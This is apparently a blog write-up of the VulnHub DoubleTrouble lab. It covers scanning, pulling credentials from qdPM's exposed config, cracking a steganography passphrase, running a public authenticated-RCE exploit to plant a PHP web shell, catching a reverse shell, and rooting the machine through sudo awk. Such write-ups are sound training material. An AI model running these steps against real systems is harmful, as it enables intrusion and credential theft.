---
layout: post
title: VulnHub DoubleTrouble Writeup
categories: VulnHub Machines
permalink: /vulnhub/double-trouble
---

Machine: [https://www.vulnhub.com/entry/doubletrouble-1,743/](https://www.vulnhub.com/entry/doubletrouble-1,743/)
Machine Author: [tasiyanci](https://www.vulnhub.com/author/tasiyanci,765/)

## Nmap

```bash
# Nmap 7.94SVN scan initiated Fri Jan 10 20:51:36 2025 as: /usr/lib/nmap/nmap -Pn -p- -A --min-rate 5000 -oN scan.txt 192.168.56.140
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.140
Host is up (0.00084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: qdPM | Login
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:B8:E1:CB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.84 ms 192.168.56.140

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 10 20:51:48 2025 -- 1 IP address (1 host up) scanned in 12.85 seconds
```

As we can see there is not much running on the server except ssh and an http server.

Let’s go ahead an visit the http server and see what we have.

![1](https://github.com/user-attachments/assets/fcd035fd-f5a2-4a5c-84c9-8cfe8ce3066f)


We can see a qdPM login screen.

Based on past experience I know that qdPM has a vulnerability where we can get access to the database credentials by accessing the /core/config/databases.yml of the website. So let’s go ahead and do that.

```bash
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      profiler: false
      username: otis
      password: "<?php echo urlencode('rush') ; ?>"
      attributes:
        quote_identifier: true  
  
```

There we go we now have a username (otis) and a password (rush). Let’s try to login to ssh using those credentials.

```bash
ssh otis@192.168.56.140
otis@192.168.56.140's password: 
Permission denied, please try again.
```

Well that doesn’t seem to work. Let’s try something else. 

We can try and perform directory busting to see what we can find.

```bash
feroxbuster -u http://192.168.56.140/ -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -n -t 100 -x txt,zip,php
                                                                                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.140/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, zip, php]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
<SNIP>
301      GET        9l       28w      317c http://192.168.56.140/images => http://192.168.56.140/images/
301      GET        9l       28w      317c http://192.168.56.140/secret => http://192.168.56.140/secret/
301      GET        9l       28w      318c http://192.168.56.140/backups => http://192.168.56.140/backups/
301      GET        9l       28w      316c http://192.168.56.140/batch => http://192.168.56.140/batch/
```

We are able to find an endpoint of /secret. After visiting that endpoint we are able to find a doubletrouble.jpg file

![2](https://github.com/user-attachments/assets/d4a1d75b-5d04-4532-a515-fa44ddde8d27)


Since it’s a .jpg file we can try to see if it has hidden text by trying to extract it using steghide and the password from earlier.

```bash
teghide extract -sf doubletrouble.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

That didn’t seem to work. We can try and bruteforce the password using stegseek to see if that works.

```bash
stegseek doubletrouble.jpg -wl /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "92camaro"

[i] Original filename: "creds.txt".
[i] Extracting to "doubletrouble.jpg.out".
```

We were able to bruteforce the password successfully. Let’s see what the file contains.

```bash
cat doubletrouble.jpg.out 
otisrush@localhost.com
otis666
```

It seems to be an email/password combination. Looking back at the qdPM login we can see that it takes and email and a password. We can try to login there using these credentials.

![3](https://github.com/user-attachments/assets/678f72fb-b78c-427b-afbe-90a4ce1c6f0d)


We were successfully able to login to qdPM. Now let’s perform some enumeration.

```bash
searchsploit qdpm      
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
qdPM 7 - Arbitrary File upload                                                                                                                                                                           | php/webapps/19154.py
qdPM 7.0 - Arbitrary '.PHP' File Upload (Metasploit)                                                                                                                                                     | php/webapps/21835.rb
qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting                                                                                                                                           | php/webapps/48486.txt
qdPM 9.1 - 'filter_by' SQL Injection                                                                                                                                                                     | php/webapps/45767.txt
qdPM 9.1 - 'search[keywords]' Cross-Site Scripting                                                                                                                                                       | php/webapps/46399.txt
qdPM 9.1 - 'search_by_extrafields[]' SQL Injection                                                                                                                                                       | php/webapps/46387.txt
qdPM 9.1 - 'type' Cross-Site Scripting                                                                                                                                                                   | php/webapps/46398.txt
qdPM 9.1 - Arbitrary File Upload                                                                                                                                                                         | php/webapps/48460.txt
qdPM 9.1 - Remote Code Execution                                                                                                                                                                         | php/webapps/47954.py
qdPM 9.1 - Remote Code Execution (Authenticated)                                                                                                                                                         | php/webapps/50175.py
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)                                                                                                                                              | php/webapps/50944.py
qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                                                                             | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                                                                           | php/webapps/50176.txt
qdPM < 9.1 - Remote Code Execution                                                                                                                                                                       | multiple/webapps/48146.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Using searchsploit we are able to find an Authenticated RCE for our version of qdPM. Let’s go ahead and use that script to get a shell.

```bash
python3 50944.py -url http://192.168.56.140/ -u otisrush@localhost.com -p otis666
You are not able to use the designated admin account because they do not have a myAccount page.

The DateStamp is 2025-01-10 15:11 
Backdoor uploaded at - > http://192.168.56.140/uploads/users/871566-backdoor.php?cmd=whoami
```

It says that the backdoor was uploaded. Let’s go ahead and check it out.

![4](https://github.com/user-attachments/assets/e5d3e3a6-85c0-40ce-b382-e5cc43f00a3f)


We now have command execution. Let’s go ahead and get a reverse shell now.

```bash
nc -lvnp 443              
listening on [any] 443 ...
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.140] 57010
bash: cannot set terminal process group (482): Inappropriate ioctl for device
bash: no job control in this shell
www-data@doubletrouble:/var/www/html/uploads/users$
```

There we go, we now have a shell. We can go ahead and upgrade this to a more interactive shell.

```bash
www-data@doubletrouble:/var/www/html/uploads/users$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<rs$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@doubletrouble:/var/www/html/uploads/users$ ^Z
zsh: suspended  nc -lvnp 443
                                                                                                                                                                                                                                           
stty raw -echo; fg                                             
[1]  + continued  nc -lvnp 443

www-data@doubletrouble:/var/www/html/uploads/users$ 
```

We now have a more interactive shell to work with. So let’s go ahead an perform some enumeration.

```bash
www-data@doubletrouble:/tmp$ sudo -l
Matching Defaults entries for www-data on doubletrouble:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on doubletrouble:
    (ALL : ALL) NOPASSWD: /usr/bin/awk
```

We are able to find that we can run /usr/bin/awk using sudo. We can abuse this to get root on the system.

```bash
www-data@doubletrouble:/tmp$ sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
root@doubletrouble:/tmp# cd /root
root@doubletrouble:~# whoami
root
```

And we were able to get root finally.
